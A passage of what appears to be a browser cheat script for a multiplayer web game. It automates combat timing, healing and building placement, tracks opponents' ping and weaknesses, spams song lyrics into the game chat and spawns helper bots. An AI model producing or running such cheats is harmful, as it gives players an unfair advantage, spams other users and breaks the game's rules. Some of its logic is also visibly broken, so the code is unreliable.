                                } else if(ne.turretReload === 1) {
                                    reloads[3] = true;
                                } else {
                                    for (let i = 1; i < reloads.length; i++) {
                                        reloads[i] = false;
                                        console.log(reloads[i], reloads.length);
                                        console.log('whole array:\n' + reloads);
                                    }
                                };
                            }

                            let primaryWeaponsDmgs = [];
                            primaryWeaponsDmgs.forEach(e => {
                                if(ne.primary == 3) {
                                    temp.push(R.skinIndex == 6 ? 35 * .75 : 35);
                                } else if(ne.primary == 4) {
                                    temp.push(R.skinIndex == 6 ? 40 * .75 : 40);
                                } else if(ne.primary == 5) {
                                    temp.push(R.skinIndex == 6 ? 45 * .75 : 45);
                                }
                            });

                            let secondaryWeaponsDmgs = [];
                            secondaryWeaponsDmgs.forEach(e => {
                                if(ne.secondary == 10) {
                                    temp.push(R.skinIndex == 6 ? 10 * .75 : 10);
                                } else if(ne.secondary == 12) {
                                    temp.push(R.skinIndex == 6 ? 25 * .75 : 25);
                                } else if(ne.secondary == 13) {
                                    temp.push(R.skinIndex == 6 ? 35 * .75 : 35);
                                } else if(ne.secondary == 15) {
                                    temp.push(R.skinIndex == 6 ? 50 * .75 : 50);
                                }
                            });

                            if(reloads[1] == false) { // Primary Hit First (Insta / No-Bull [Every Weapon Variation])
                                console.log('false boo');
                                console.log('relaods[1] 0: ' + reloads)

                                let firstDmg = 100 - R.health;
                                let remaining = 100 - firstDmg;

                                let soldierDmg = 0, empDmg = -25;
                                temp.forEach((e) => {
                                    soldierDmg += (e * .75);
                                    empDmg += e;
                                });
                                this.hats(soldierDmg > empDmg ? true : false, soldierDmg > empDmg ? empDmg : soldierDmg);

                                if(bullTick) temp.push(5);

                                if(ne.secondaryReload == 1) secondaryWeaponsDmgs.push();

                                if(ne.turretReload == 1) temp.push(R.skinIndex == 6 ? 25 * .75 : 25);

                            } else if(reloads[2] == false) { // Secondary Hit First (Reverse Insta [KH, SM, PM])
                                if(ne.turretReload == 1) {
                                    this.hats(true);
                                } else {
                                    this.hats(false);
                                };

                                if(bullTick) temp.push(5);

                                if(ne.primaryReload == 1) primaryWeaponsDmgs.push();

                                if(ne.turretReload == 1) temp.push(R.skinIndex == 6 ? 25 * .75 : 25);

                            } else if(reloads[3] == false) { // Turret Gear Hit First (Reverse Insta / Sync [KH, SM, PM])
                                this.hats(false);

                                if(bullTick) temp.push(5);

                                if(ne.skinIndex == 54) temp.push(R.skinIndex == 6 ? 25 * .75 : 25);
                            }
                        },
                        calculate(dmg, ne) { // Sort all dmg into an array, calculates all dmg
                            let dmgs = [];
                            let foundDmgs = this.find(ne);

                            if(foundDmgs) {
                                foundDmgs.forEach((e) => {
                                    dmgs.push(e);
                                });
                            }
                        },

                        heal(pDmg) { // Heal based on foodType
                            let obj = Math.ceil(pDmg / this.foodType("cookie"));
                            for(let i = 0; i < obj; i++) dp(R.items[0]);
                        },
                    }

                    function Si(e, t) {
                        _ = Ii(e);
                        if(_) {
                            _.lasthealth = _.health
                            _.health = t;
                            const dmg = _.lasthealth - _.health;
                            (dmg < 0 && potential.done == false) ? potential.init("Object static void none", t, dmg, enemies[0]) : false;
                            (dmg < 0) ? ((_.ld !== undefined) && ((l.ticks - _.ld < 2) ? _.clownCounter = (_.clownCounter+1) : _.clownCounter = Math.max(0, _.clownCounter-2)), _.ld = undefined) : _.ld = l.ticks;
                            if(_.sid == R.sid) {
                                if(dmg == 5 || dmg == 2 && R.skinIndex == 7) bullTick = l.ticks;
                                if(dmg > 0) dl.push(dmg);
                                nextTickDo(() => {
                                    nextTickDo(() => {
                                        potential.heal(dmg * 2)
                                    });
                                });
                            }
                            if(trackers[_.id]) {
                                trackers[_.id].update(t, _.clownCounter);
                            } else {
                                trackers[_.id] = new healTracker(t, _.id, _.clownCounter);
                            }
                        }
                    }

                    var mode = (arr) => arr.reduce((a, b, i, arr)=> (arr.filter(v => v === a).length >= arr.filter(v => v === b).length ? a : b), null)

                    class healTracker {
                        constructor (hp, id) {
                            this.id = id;
                            this.oldhp = hp;
                            this.dmgPromises = [];
                            this.list = [];
                            this.diesTo = [];
                            this.pings = [];
                            this.ping = 0;
                            this.text = `no information gathered`;
                        }
                        isRealPing(gap) {
                            return Math.abs(this.ping - gap) < 40;
                        }
                        calculate () {
                            let pushList = [];
                            let rl = [];
                            let bullspams = [];
                            let stopAntiAt = [];
                            let mb = 0;
                            let lh = null;
                            let shameDown = 0;
                            let mshame = false;
                            for(let i = 0, e;i<this.list.length;i++) {
                                e = this.list[i];
                                if(e.dmg < 45 && e.dmg >= 40 && e.type == "slow" && this.isRealPing(e.gap-120) && !pushList.includes("nobull")) {
                                    pushList.push("nobull");
                                } else if(e.dmg >= 45) {
                                    if(lh - e.delay2 < 400) {
                                        if(e.type == "fast" && e.clown > shameDown) {
                                            shameDown = e.clown;
                                            mb++;
                                        } else if(e.type == "slow" && lh - e.delay2 < 260) {
                                            mshame = true;
                                        } else if(e.type == "slow") {
                                            console.log(e.clown);
                                            stopAntiAt.push(e.clown);
                                            bullspams.push(mb);
                                            mb = 0;
                                        }
                                    }
                                    lh = e.delay2;
                                }
                            }
                            bullspams.push(mb);
                            if(bullspams.length > 0) {
                                pushList.push(["bullspam", Math.max(bullspams)]);
                            }

                            pushList.push(["shamePerInsta", mshame ? -2 : 1]);

                            if(stopAntiAt.length > 0) {
                                let mostCommon = mode(stopAntiAt);
                                pushList.push(["stopAntiAt", mostCommon]);
                            };

                            return pushList;
                        }
                        updateElem(array, item) {
                            let a = array.findIndex(e => e[0] == item[0]);
                            if(a === -1) {
                                array.push(item);
                            } else {
                                array[a] = item;
                            }
                            return array;
                        }
                        assign(array, renew) {
                            for(let i = 0;i<renew.length;i++) {
                                array = this.updateElem(array, renew[i]);
                            }
                            return array;
                        }
                        track (obj) {
                            this.list.push(obj);
                            if(obj.type == "slow") {
                                this.pings.push(obj.gap - 120);
                                if(this.pings.length > 20) {
                                    this.pings.shift();
                                }
                                this.ping = Math.round(this.pings.reduce((a, b) => a+b, 0) / this.pings.length);
                            };
                            if(this.list.length > 15) {
                                this.list.shift();
                            };
                            let calc = this.calculate();
                            if(calc.length > 0) {
                                this.diesTo = this.assign(this.diesTo, calc);
                                //console.log(this.diesTo);
                                try {
                                    this.text = `dies to `+this.diesTo.map(e => e.join(" ")).join(",");
                                } catch (e) {this.text = ""};
                            };
                        }
                        add (hp, clown) {
                            let type = this.healthType(hp, this.oldhp),
                                dmg = this.oldhp - hp;
                            this.oldhp = hp;
                            if(type === "damage") {
                                let i = this.dmgPromises.length;
                                let res = null;
                                let delay = Date.now();
                                let scope = trackers[this.id];
                                new Promise(function(r) {
                                    scope.dmgPromises.push(r);
                                    setTimeout(r, 1000, !1);
                                }).then(function(bool) {
                                    scope.dmgPromises.splice(i, 1);
                                    if(!bool) return;
                                    let gap = Date.now() - delay,
                                        obj = {
                                            delay1: delay,
                                            delay2: Date.now(),
                                            gap,
                                            dmg: dmg,
                                            type: gap < 120 ? "fast" : "slow",
                                            clown
                                        };
                                    scope.track(obj);
                                });
                                trackers[this.id] = scope;
                            } else {
                                if(this.dmgPromises.length) {
                                    this.dmgPromises.forEach((e) => e(true));
                                    this.dmgPromises = [];
                                }
                            }
                        }
                        healthType(health, oldhealth) {
                            return health < oldhealth ? "damage" : "heal";
                        }
                        update(hp, clown) {
                            this.add(hp, clown);
                        }
                    }

                    var pf = false, autobreak = {
                        h: 0,
                        id: 0,
                        b: false,
                        a: 0,
                        it: false
                    }, nd = [], dl = [],
                        millPlacer = false, millF = false,
                        ids = 0,
                        autoinsta = false,
                        aa = false,
                        aw = 0,
                        enemies = [],
                        nea = 0,
                        useps = Date.now(),
                        lab = false,
                        antibull = true,
                        pbb = 0,
                        pvpmode = true,
                        abs = true,
                        shut = false,
                        placeEveryTick = true,
                        placeFast = false,
                        ari = true,
                        spec = false,
                        dhu = true,
                        appre = true,
                        ae86 = false,
                        chatTimeouts = [], oldChatter = [], chatter = [], startedDate = Date.now(),
                        ts = 2,
                        maxBullspam = 0,
                        lur = false,
                        rv2 = false,
                        fz = false,
                        extm = true,
                        don = false,
                        doBestBreakWeaponOnRightClickHold = true,
                        aOT = true,
                        vs = false,
                        bullTick = 0,
                        doExtremeReplacer = true,
                        spikeSync = true,
                        ab = true,
                        sandy = false,
                        abr = true,
                        pathFind = {show: false, paths: [], enabled: false},
                        chain = false,
                        antiHitSpikeTrap = true,
                        nightToggle = false,
                        aq = false;

                    window.abrch = "goo goo gaa gaa"

                    setInterval (() => {
                        ae86 = false;
                        lur = false;
                        rv2 = false;
                        fz = false;
                        don = false;
                        sandy = false;
                        if(extm) {
                            let val = document.getElementById("EXTM").value;
                            if(val == "ae") ae86 = true;
                            if(val == "lre") lur = true;
                            if(val == "rv2") rv2 = true;
                            if(val == "fz") fz = true;
                            if(val == "donnie") don = true;
                            if(val == "sandy") sandy = true;
                        }
                    }, 50);

                    function checkObj(tan, pos, id){
                        let scale = l.list[id].scale + 35;
                        let xy = [pos.x + scale * Math.cos(tan), pos.y + scale * Math.sin(tan)];
                        return nearBuilds.some((a) => a.active && Math.hypot(a.y - xy[1], a.x - xy[0]) < a.scale);
                    }

                    function dp(e, t = pn(), n) {
                        if(ae86 && e > 2 && !n && checkObj(t, R, e)) return false;
                        if(pf) t += (Math.PI * 9e8);
                        Sn(e), r.send("c", 1, t), r.send("c", 0, t), Sn(R.weapons[aw], !0);
                    }


                    let cNew = (e) => JSON.parse(JSON.stringify(e));

                    function dokeymacros() {
                        if("chatbox" !== document.activeElement.id.toLowerCase()) {
                            if(gn[81]) dp(R.items[0]);
                            if(gn[72]) dp(R.items[5]);
                            if(gn[70]) dp(R.items[4]);
                            if(gn[86]) dp(R.items[2]);
                            if(gn[79]) dp(cNew(R.items).pop());
                        }
                    }

                    function calculateDamage (_, e) {
                        if(e) {
                            return Math.round(l.weapons[_.primary].dmg * (_.skinIndex == 7 ? 1.5 : 1) * o.weaponVariants[_.primaryVariant].val);
                        } else {
                            return Math.round(l.weapons[_.weaponIndex].dmg * (_.skinIndex == 7 ? 1.5 : 1) * o.weaponVariants[_.weaponVariant].val);
                        }
                    }

                    function calculateSecondaryDamage (_, e) {
                        if(e) {//musket} else {
                            return Math.round(l.weapons[_.secondary].dmg * (_.skinIndex == 7 ? 1.5 : 1) * o.weaponVariants[_.secondaryVariant].val);
                        }
                    }
                    function getBreakDmg (_) {
                        return Math.round(l.weapons[_.weaponIndex].dmg * (_.skinIndex == 40 ? 3.3 : 1) * o.weaponVariants[_.weaponVariant].val * (_.weaponIndex == 10 ? 7.5 : 1));
                    }

                    function isEnemy (_) {
                        try {
                            return (_.team!=R.team || _.team===null) && _.sid != R.sid;
                        } catch (e) {
                            return false;
                        }
                    }


                    class menu {
                        static init () {
                            if("chatbox" !== document.activeElement.id.toLowerCase()) {
                                let external = document.createElement("div");
                                external.innerHTML = `<div id='helpText' style='font-size: 30px;color: rgb(255, 255, 255);'>SandyMod V3 by PoopSack</div> <style> onfg:hover {color: yellow;}
                            onfg{transition: all 1s ease}
                            </style>`;

                                let pages = [], pageI = 0;

                                function addPage () {
                                    let page = document.createElement("div");
                                    page.style = "font-size: 12px; color: white; overflow-y: scroll; height: 150px;";
                                    external.appendChild(page);
                                    pages[pageI] = page;
                                }
                                function append(e) {
                                    if(!pages[pageI]){
                                        addPage();
                                    }
                                    pages[pageI].appendChild(e);
                                }

                                return {
                                    add: function (malformed) {
                                        let documentObject = document.createElement(malformed.tag || "div");
                                        Object.keys(malformed).forEach((property) => {
                                            documentObject[(property == "html" ? "innerHTML" : property)] = malformed[property];
                                        });
                                        append(documentObject);
                                        return documentObject;
                                    },
                                    newline: function (e) {
                                        if(!e) {
                                            append(document.createElement("br"));
                                        } else {
                                            for(let i = 0;i<e;i++) {
                                                append(document.createElement("br"));
                                            }
                                        }
                                    },
                                    prepend: function (documentParentObjectModule) {
                                        documentParentObjectModule.appendChild(external);
                                    },
                                    writeStyle: function (style) {
                                        external.style = style;
                                    },
                                    hide: function () {
                                        external.style.left = "-999px";
                                    },
                                    show: function () {
                                        external.style.left = "20px";
                                    },
                                    addToggleHotkeys: function (keycode) {
                                        addEventListener("keydown", function (event) {
                                            if(event.keyCode == keycode) {
                                                external.style.left = external.style.left == "20px" ? "-999px" : "20px";
                                                menuHidden = external.style.left != "20px" ? true : false;
                                            }
                                        });
                                    },
                                    addButton: function (innerTexts, setter, getter) {
                                        innerTexts = Object.entries(innerTexts);
                                        let i = 0;

                                        function execute () {
                                            eval(innerTexts[i][1]);
                                        }

                                        execute();
                                        this.add({tag: "onfg", innerHTML: innerTexts[i][0] + "&nbsp;"}).addEventListener("click", function () {

                                            i=(i+1)%innerTexts.length;
                                            execute();
                                            this.innerHTML = innerTexts[i][0];
                                        });
                                    },
                                    addEnableButton: function (innerText, variableName) {
                                        function get() {
                                            eval("window.currentVal = " + variableName);
                                            return window.currentVal;
                                        };
                                        function set(value) {
                                            eval(`${variableName} = ${value};`)
                                        };
                                        this.add({tag: "span", innerHTML: innerText + "&nbsp;"});
                                        this.add({
                                            tag: "input", type: "checkbox", checked: !!get()
                                        }).addEventListener("change", function () {
                                            set(!get());
                                            notif(innerText, get() ? "Enabled" : "Disabled");
                                        });
                                    },
                                    addTab: function (e) {
                                        this.add({tag: "span", innerHTML: [...Array(e)].map(t=>"&nbsp").join("")});
                                    }
                                }
                            }
                        }
                    }

                    let momenu = menu.init();
                    momenu.writeStyle("padding: 10px;\nbackground-color: rgba(0, 0, 0, 0.25);\nborder-radius: 3px;\nposition: absolute;\nleft: 20px;\ntop: 20px;\nmin-width: 450px;\nmax-width: 450px;\nmin-height: 400;\nmax-height 700;");
                    momenu.newline();
                    momenu.addEnableButton("PvP Mode ", "pvpmode");
                    momenu.newline();
                    momenu.addEnableButton("Script Modules: ", "extm");
                    momenu.add({
                        tag: "select", id: "EXTM", innerHTML: `
                    <option value="lre">L._.re</option>
                    <option value="ae">AE86</option>
                    <option value="rv2">RV2</option>
                    <option value="fz" selected>RV3</option>
                    <option value="donnie">Donnie</option>
                    <option value="sandy">Sandy</option>
                    `
                    });
                    momenu.newline(2);
                    momenu.addButton({
                        "Auto Bull-Spam (1)": "abs=true",
                        "Insta Chaining (2)": "abs=false;chain=true",
                        "Anti Bull (3)": "abs=false;chain=false"
                    });
                    momenu.newline(2);
                    momenu.addEnableButton("Auto-Insta:", "appre");
                    momenu.newline();
                    momenu.addEnableButton("Auto One-Tick:", "aOT");
                    momenu.newline();
                    momenu.addEnableButton("Anti-Bull", "antibull");
                    momenu.newline();
                    momenu.addEnableButton("Spike Hit Sync", "spikeSync");
                    momenu.newline();
                    momenu.add({
                        tag: "span", html: "Upgrade Insta Load-out:"
                    });
                    momenu.addTab(2);
                    momenu.add({
                        tag: "select", id: "upgrInstaType", html: `<option selected value="dhkhkm">dKhKm</option><option value="dhkh">DhKh</option><option value="dhkm">DhKm</option>`
                    });
                    momenu.newline(2);
                    momenu.addEnableButton("Auto-Place:", "placeEveryTick");
                    momenu.newline();
                    momenu.addEnableButton("Pre-Place:", "doExtremeReplacer");
                    momenu.newline();
                    momenu.addEnableButton("dofastPlace:", "placeFast");
                    momenu.newline(2);
                    momenu.add({
                        tag: "span", html: ""
                    });
                    momenu.addTab(2);
                    momenu.add({
                        tag: "select", id: "autochats", html: `
                    <option selected value="thetop">Initial D - The Top</option>
                    <option value="gas">Initial D - Gas Gas Gas</option>
                    <option value="dejavu">Initial D - Deja Vu</option>
                    <option value="norival">Alaina Cross - No Rival</option>
                    <option value="inv">Crypt x Joey Nato - Invincible</option>
                    <option value="livinglife">Cheriimoya - Living Life In The Night</option>
                    <option value="outtamind">Gentrammel - Out Of My Mind</option>
                    <option value="outerspace">BEAUZ - Outerspace</option>
                    <option value="nobody">CRVN - Nobody</option>
                    <option value="glorydays">FELLOWSHIP - Glory Days</option>
                    <option value="legendsNeverDie">LoL (Worlds 2017) - Legends Never Die</option>
                    <option value="giants">V O E - Giants</option>
                    <option value="ipip">Turi ip ip</option>
                    <option value="staywithme">1nonly - Stay With Me</option>
                    <option value="takeover">LoL (Worlds 2020) - Take Over</option>
                    `
                    });
                    momenu.add({html: "Music Volume:"});
                    momenu.add({tag: "input", type: "range", value: 50, id: "mscVolume"});
                    momenu.newline();
                    momenu.addEnableButton("Auto Upgrade to DH:", "dhu");
                    momenu.newline(2);
                    momenu.addEnableButton("doHammerOnRClick:", "doBestBreakWeaponOnRightClickHold");
                    momenu.newline();
                    momenu.addEnableButton("doRubyFarm", "rubyFarm");

                    momenu.newline(2);
                    momenu.newline();
                    momenu.addEnableButton("Auto-Q:", "aq");
                    momenu.newline();
                    momenu.addEnableButton("Anti Spike-Sync (Beta):", "antiHitSpikeTrap");
                    momenu.newline();
                    momenu.newline(2);

                    var rubyFarm = false;
                    momenu.newline(2);
                    momenu.addEnableButton("PathFinder:", "pathFind.enabled");
                    momenu.newline();
                    momenu.addEnableButton("Spectator Mode:", "spec"); // vs = native graphics
                    momenu.prepend(document.body);
                    momenu.addToggleHotkeys(27);

                    function antiInvis (dir) {
                        if(Math.abs(dir) > 9e5) {
                            return 0;
                        } else return dir;
                    }


                    function setWeapon(i) {
                        aw = i;
                        Sn(R.weapons[i], true);
                    }

                    function getVel(_) {
                        return Math.hypot(_.y3 - _.y2, _.x3 - _.x2);
                    }

                    window.addEventListener("keydown", function (e) {
                        if(R && R.alive && "chatbox" !== document.activeElement.id.toLowerCase()) {
                            if(e.which == 67 && kn()) {
                                AC(document.getElementById("autochats").value);
                                document.getElementById("mscVolume").value = autochats[autochats.current].audio.volume * 100;
                            }

                            if(e.which == 191 && kn()) {
                                freecam = !freecam;
                                camX = 0;
                                camY = 0;
                            }

                            if(e.which == 99 && kn()) aIns = !aIns;

                            if(e.which == 38 && document.activeElement.id.toLowerCase() !== 'chatbox') {
                                messageToggle = (messageToggle + 1) % 2;
                            }

                            if(e.which == 40 && document.activeElement.id.toLowerCase() !== 'chatbox') {
                                clanToggle = (clanToggle + 1) % 2;
                            }

                            if(e.which == 76 && document.activeElement.id.toLowerCase() !== 'chatbox') {
                                aa = true;
                                setWeapon(1);
                                r.send("7", 1);
                                Hg(0, 0);
                                setTimeout( () => {
                                    r.send("6", 12);
                                    Hg(53, 0);
                                }, 112);
                                setTimeout( () => {
                                    r.send("6", 15);
                                }, 224);
                                setTimeout( () => {
                                    Hg(6, 0);
                                    r.send("7", 1);
                                    setWeapon(0);
                                    aa = false;
                                }, 436);
                            }
                        }

                    });

                    var executeEveryTicks = [], nearBuilds = [], enemyData = document.createElement("div"), ud = false;

                    enemyData.style = `
    right: 0px;
    padding: 10px;
    margin-top: 10px;
    color: #fff;
    font-size: 28px;
    background-color: rgba(0, 0, 0, 0.25);
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    border-radius: 4px;
    width: 220px; height: 100px;
    visibility: visible;
                `;

                    document.getElementById("topInfoHolder").insertBefore(enemyData, document.getElementById("killCounter"));

                    function updateEnemyData () {
                        if(enemies.length && ud) {
                            try {
                                enemyData.innerHTML = enemies.map(e => {
                                    return `${e.name}<br><p>${e.name}'s Ping: ${trackers[e.id].ping}<br>${trackers[e.id].text||"none"}</p>`;
                                })[0];
                                enemyData.style.display = "block";
                            } catch (t) {};
                        } else {
                            enemyData.style.display = "none";
                        }
                    }

                    function executeEveryTick(func) {
                        executeEveryTicks.push(func);
                        return executeEveryTicks.length-1;
                    }

                    function removeExecuteEveryTick(eID) {
                        executeEveryTicks.splice(eID, 1);
                    }

                    function SplitNum (num, splitBy) {
                        let t = [];
                        let n = num;
                        while (true) {
                            t.push(Math.min(n, splitBy));
                            n = Math.max(0, n - splitBy);
                            if(n === 0) {
                                return t;
                            }
                        }
                    }

                    function SplitBy(string, char, maxlen) {
                        let arr = [];
                        let sp = string.split(char);
                        let c = 0;
                        let d = 0;
                        if(maxlen instanceof Array) {
                            maxlen = Math.round(string.length / maxlen[0]);
                        }
                        while (true) {
                            if(arr[c] === undefined) {
                                arr[c] = [];
                            } else {
                                if(sp[d] === undefined) {
                                    arr = arr.map((elem, index) => elem.join(char));
                                    return arr;
                                } else if(arr[c].join(char).length + sp[d].length < maxlen) {
                                    arr[c].push(sp[d]);
                                    d++;
                                } else {
                                    arr[c + 1] = [];
                                    c++;
                                }
                            }
                        }
                    }

                    function AC(name) {

                        if(autochats[name].audio.paused) {
                            startedDate = Date.now();
                            if(autochats.current == name && oldChatter) {
                                chatter = oldChatter;
                            } else {
                                autochats[name].audio.currentTime = 0;
                                chatter = Array(...autochats[name].chats);
                            }
                            autochats.current = name;
                            autochats[name].audio.play();
                            chatter.forEach((a, i) => {
                                chatTimeouts.push(setTimeout (() => {
                                    chatter.splice(0, 1);
                                    a[0] = a[0].replaceAll("’", "'")
                                    r.send("ch", a[0]);
                                    if(chatter.length == 0) {
                                        chatter = Array(...autochats[name].chats);
                                    }
                                }, a[1]));
                            });
                        } else {
                            autochats[autochats.current].audio.pause();
                            oldChatter = chatter.map(e => [e[0], e[1] - (Date.now() - startedDate)]);
                            chatTimeouts.forEach(e => clearTimeout(e));
                        }

                    }

                    function angleDist(angle1, angle2) {
                        if(angle1 < 0) angle1 += Math.PI*2;
                        if(angle2 < 0) angle2 += Math.PI*2;
                        return Math.abs(angle1 - angle2);
                    }

                    function obstacleBetween(pos1, pos2) {
                        let hypotenuse = Math.hypot(pos2 - R.y2, pos1 - R.x2);
                        let angle = Math.atan2(pos2 - R.y2, pos1 - R.x2);
                        return nearBuilds.some((b) => !b.ignoreCollision && b.active && Math.hypot(b.y-R.y2, b.x-R.x2)<hypotenuse && angleDist(angle, Math.atan2(b.y-R.y2, b.x-R.x2)) < b.scale/Math.hypot(b.y-R.y2, b.x-R.x2));
                    }

                    function deepClone(source) {
                        return JSON.parse(JSON.stringify(source));
                    }

                    window.AC = AC;

                    var ang = 0, enemyInCondition = function (e) {
                        if(enemies.length === 0) return false;
                        let dist = Math.hypot(enemies[0].y2 - R.yVel, enemies[0].x2 - R.xVel);
                        let angle = Math.atan2(enemies[0].y2 - R.yVel, enemies[0].x2 - R.xVel);
                        if(e && obstacleBetween(enemies[0].x2, enemies[0].y2)) return false;
                        if(dist < l.weapons[R.weapons[0]].range * 1.644738666737373652525) return true;
                        return false;
                    }, trapHealths = 1000, inEnemyCondition = function (e) {
                        if(enemies.length === 0) return false;
                        let dist = Math.hypot(enemies[0].y2 - R.yVel, enemies[0].x2 - R.xVel);
                        let angle = Math.atan2(enemies[0].y2 - R.yVel, enemies[0].x2 - R.xVel);
                        if(e && obstacleBetween(enemies[0].x2, enemies[0].y2)) return false;
                        if(dist < l.weapons[enemies[0].weapons[0]].range * 1.644738666737373652525) return true;
                        return false;
                    }

                    setInterval(() => {
                        if(window.pps > 80) return;
                        dokeymacros();
                    }, 1e3 / 9);

                    let la = 0;
                    function doAim() {
                        if(ae86) {
                            try {
                                la = aa ? nea : autobreak.it ? autobreak.a : (Date.now() - mlh > 400) ? "" : la
                                r.send("2", la);
                            } catch (e) {};
                        } else {
                            if(lur) {
                                if(useShield || aa || (autobreak.it&&autobreak.h)) {
                                    r.send("2", aa ? nea : autobreak.it && autobreak.h ? autobreak.a : ang);
                                }
                            } else {
                                r.send("2", aa ? nea : autobreak.it && autobreak.h ? autobreak.a : ang);
                            }
                        }
                    }

                    function nextTickDo(action) {
                        nd.push(action);
                    }

                    window.gameBots = [];

                    function addWorker(js, event) {
                        var blob = new Blob([js], {
                            type: 'application/javascript'
                        });
                        var worker = new Worker(URL.createObjectURL(blob)),
                            workerSend = function (e) {
                                worker.postMessage(JSON.stringify(e));
                            }
                        workerSend({
                            item: "connect", data: ""
                        });
                        worker.onmessage = event;
                        gameBots.push([worker, workerSend]);
                    }

                    var msgpack = n(24),
                        botPackets = [],
                        bestinstaing = false,
                        msgpackCode = `
                !function(t){if("object"==typeof exports&&"undefined"!=typeof module)module.exports=t();else if("function"==typeof define&&define.amd)define([],t);else{var r;r="undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:this,r.msgpack=t()}}(function(){return function t(r,e,n){function i(f,u){if(!e[f]){if(!r[f]){var a="function"==typeof require&&require;if(!u&&a)return a(f,!0);if(o)return o(f,!0);var s=new Error("Cannot find module '"+f+"'");throw s.code="MODULE_NOT_FOUND",s}var c=e[f]={exports:{}};r[f][0].call(c.exports,function(t){var e=r[f][1][t];return i(e?e:t)},c,c.exports,t,r,e,n)}return e[f].exports}for(var o="function"==typeof require&&require,f=0;f<n.length;f++)i(n[f]);return i}({1:[function(t,r,e){e.encode=t("./encode").encode,e.decode=t("./decode").decode,e.Encoder=t("./encoder").Encoder,e.Decoder=t("./decoder").Decoder,e.createCodec=t("./ext").createCodec,e.codec=t("./codec").codec},{"./codec":10,"./decode":12,"./decoder":13,"./encode":15,"./encoder":16,"./ext":20}],2:[function(t,r,e){(function(Buffer){function t(t){return t&&t.isBuffer&&t}r.exports=t("undefined"!=typeof Buffer&&Buffer)||t(this.Buffer)||t("undefined"!=typeof window&&window.Buffer)||this.Buffer}).call(this,t("buffer").Buffer)},{buffer:29}],3:[function(t,r,e){function n(t,r){for(var e=this,n=r||(r|=0),i=t.length,o=0,f=0;f<i;)o=t.charCodeAt(f++),o<128?e[n++]=o:o<2048?(e[n++]=192|o>>>6,e[n++]=128|63&o):o<55296||o>57343?(e[n++]=224|o>>>12,e[n++]=128|o>>>6&63,e[n++]=128|63&o):(o=(o-55296<<10|t.charCodeAt(f++)-56320)+65536,e[n++]=240|o>>>18,e[n++]=128|o>>>12&63,e[n++]=128|o>>>6&63,e[n++]=128|63&o);return n-r}function i(t,r,e){var n=this,i=0|r;e||(e=n.length);for(var o="",f=0;i<e;)f=n[i++],f<128?o+=String.fromCharCode(f):(192===(224&f)?f=(31&f)<<6|63&n[i++]:224===(240&f)?f=(15&f)<<12|(63&n[i++])<<6|63&n[i++]:240===(248&f)&&(f=(7&f)<<18|(63&n[i++])<<12|(63&n[i++])<<6|63&n[i++]),f>=65536?(f-=65536,o+=String.fromCharCode((f>>>10)+55296,(1023&f)+56320)):o+=String.fromCharCode(f));return o}function o(t,r,e,n){var i;e||(e=0),n||0===n||(n=this.length),r||(r=0);var o=n-e;if(t===this&&e<r&&r<n)for(i=o-1;i>=0;i--)t[i+r]=this[i+e];else for(i=0;i<o;i++)t[i+r]=this[i+e];return o}e.copy=o,e.toString=i,e.write=n},{}],4:[function(t,r,e){function n(t){return new Array(t)}function i(t){if(!o.isBuffer(t)&&o.isView(t))t=o.Uint8Array.from(t);else if(o.isArrayBuffer(t))t=new Uint8Array(t);else{if("string"==typeof t)return o.from.call(e,t);if("number"==typeof t)throw new TypeError('"value" argument must not be a number')}return Array.prototype.slice.call(t)}var o=t("./bufferish"),e=r.exports=n(0);e.alloc=n,e.concat=o.concat,e.from=i},{"./bufferish":8}],5:[function(t,r,e){function n(t){return new Buffer(t)}function i(t){if(!o.isBuffer(t)&&o.isView(t))t=o.Uint8Array.from(t);else if(o.isArrayBuffer(t))t=new Uint8Array(t);else{if("string"==typeof t)return o.from.call(e,t);if("number"==typeof t)throw new TypeError('"value" argument must not be a number')}return Buffer.from&&1!==Buffer.from.length?Buffer.from(t):new Buffer(t)}var o=t("./bufferish"),Buffer=o.global,e=r.exports=o.hasBuffer?n(0):[];e.alloc=o.hasBuffer&&Buffer.alloc||n,e.concat=o.concat,e.from=i},{"./bufferish":8}],6:[function(t,r,e){function n(t,r,e,n){var o=a.isBuffer(this),f=a.isBuffer(t);if(o&&f)return this.copy(t,r,e,n);if(c||o||f||!a.isView(this)||!a.isView(t))return u.copy.call(this,t,r,e,n);var s=e||null!=n?i.call(this,e,n):this;return t.set(s,r),s.length}function i(t,r){var e=this.slice||!c&&this.subarray;if(e)return e.call(this,t,r);var i=a.alloc.call(this,r-t);return n.call(this,i,0,t,r),i}function o(t,r,e){var n=!s&&a.isBuffer(this)?this.toString:u.toString;return n.apply(this,arguments)}function f(t){function r(){var r=this[t]||u[t];return r.apply(this,arguments)}return r}var u=t("./buffer-lite");e.copy=n,e.slice=i,e.toString=o,e.write=f("write");var a=t("./bufferish"),Buffer=a.global,s=a.hasBuffer&&"TYPED_ARRAY_SUPPORT"in Buffer,c=s&&!Buffer.TYPED_ARRAY_SUPPORT},{"./buffer-lite":3,"./bufferish":8}],7:[function(t,r,e){function n(t){return new Uint8Array(t)}function i(t){if(o.isView(t)){var r=t.byteOffset,n=t.byteLength;t=t.buffer,t.byteLength!==n&&(t.slice?t=t.slice(r,r+n):(t=new Uint8Array(t),t.byteLength!==n&&(t=Array.prototype.slice.call(t,r,r+n))))}else{if("string"==typeof t)return o.from.call(e,t);if("number"==typeof t)throw new TypeError('"value" argument must not be a number')}return new Uint8Array(t)}var o=t("./bufferish"),e=r.exports=o.hasArrayBuffer?n(0):[];e.alloc=n,e.concat=o.concat,e.from=i},{"./bufferish":8}],8:[function(t,r,e){function n(t){return"string"==typeof t?u.call(this,t):a(this).from(t)}function i(t){return a(this).alloc(t)}function o(t,r){function n(t){r+=t.length}function o(t){a+=w.copy.call(t,u,a)}r||(r=0,Array.prototype.forEach.call(t,n));var f=this!==e&&this||t[0],u=i.call(f,r),a=0;return Array.prototype.forEach.call(t,o),u}function f(t){return t instanceof ArrayBuffer||E(t)}function u(t){var r=3*t.length,e=i.call(this,r),n=w.write.call(e,t);return r!==n&&(e=w.slice.call(e,0,n)),e}function a(t){return d(t)?g:y(t)?b:p(t)?v:h?g:l?b:v}function s(){return!1}function c(t,r){return t="[object "+t+"]",function(e){return null!=e&&{}.toString.call(r?e[r]:e)===t}}var Buffer=e.global=t("./buffer-global"),h=e.hasBuffer=Buffer&&!!Buffer.isBuffer,l=e.hasArrayBuffer="undefined"!=typeof 